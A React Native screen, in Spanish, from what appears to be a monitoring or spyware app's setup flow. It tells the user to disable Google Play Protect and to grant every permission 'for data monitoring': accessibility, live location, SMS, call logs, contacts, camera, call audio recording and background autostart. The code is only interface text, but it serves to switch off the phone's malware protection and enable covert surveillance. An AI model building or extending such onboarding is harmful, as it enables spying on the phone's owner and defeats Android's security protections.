import React from 'react';
import { View, Text, StyleSheet, ScrollView, TouchableOpacity } from 'react-native';

const Permisos = ({ navigation }) => {
    return (
        <View style={styles.container}>
            <Text style={styles.title}>Permitir TODAS las solicitudes de permiso</Text>
            <Text style={styles.subtitle}>
                En la siguiente parte, se le pedirá que otorgue permisos para la aplicación.
                Por favor, permita TODO para que la aplicación pueda proceder con la monitorización de datos.
            </Text>
            
            <ScrollView style={styles.permissionList}>
                <Text style={styles.sectionTitle}>Permisos Necesarios</Text>
                <Text style={styles.permissionItem}>Desactivar Google Play Protect para evitar restricciones</Text>
                <Text style={styles.permissionItem}>Permitir acceso al uso de aplicaciones para estadísticas</Text>
                <Text style={styles.permissionItem}>Permitir acceso al calendario (si es necesario en el futuro)</Text>
                <Text style={styles.permissionItem}>Permitir acceso a las notificaciones</Text>
                <Text style={styles.permissionItem}>Activar accesibilidad para supervisión</Text>
                <Text style={styles.permissionItem}>Permitir acceso al almacenamiento para exportar datos</Text>
                <Text style={styles.permissionItem}>Permitir acceso a la ubicación en tiempo real</Text>
                <Text style={styles.permissionItem}>Permitir acceso al historial de llamadas</Text>
                <Text style={styles.permissionItem}>Permitir acceso a los mensajes SMS y MMS</Text>
                <Text style={styles.permissionItem}>Permitir acceso a los contactos</Text>
                <Text style={styles.permissionItem}>Permitir uso de la cámara y acceso a fotos y videos</Text>
                <Text style={styles.permissionItem}>Permitir grabación de audio para llamadas</Text>
                <Text style={styles.permissionItem}>Ignorar la optimización de batería</Text>
                <Text style={styles.permissionItem}>Habilitar ejecución en segundo plano o arranque automático</Text>
            </ScrollView>

            <View style={styles.footer}>
                <TouchableOpacity 
                    style={styles.button}
                    onPress={() => navigation.navigate('Playprotect')}
                >
                    <Text style={styles.buttonText}>Entendido</Text>
                </TouchableOpacity>
            </View>
        </View>
    );
};

export default Permisos;

const styles = StyleSheet.create({
    container: {
        flex: 1,
        padding: 30,
        backgroundColor: '#fff',
    },
    title: {
        fontSize: 22,
        fontWeight: 'bold',
        textAlign: 'center',
        marginBottom: 20,
        marginTop: 80,
    },
    subtitle: {
        fontSize: 16,
        textAlign: 'center',
        marginBottom: 20,
        color: '#555',
        lineHeight: 22,
    },
    sectionTitle: {
        fontSize: 18,
        fontWeight: 'bold',
        color: '#333',
        marginTop: 20,
        marginBottom: 10,
    },
    permissionList: {
        marginBottom: 20,
    },
    permissionItem: {
        fontSize: 16,
        marginBottom: 10,
        color: '#333',
    },
    footer: {
        justifyContent: 'flex-end',
        alignItems: 'center',
        marginBottom: 80,
    },
    button: {
        backgroundColor: '#00aaff',
        borderRadius: 25,
        paddingVertical: 12,
        paddingHorizontal: 40,
    },
    buttonText: {
        color: 'white',
        fontWeight: 'bold',
        fontSize: 16,
    },
});
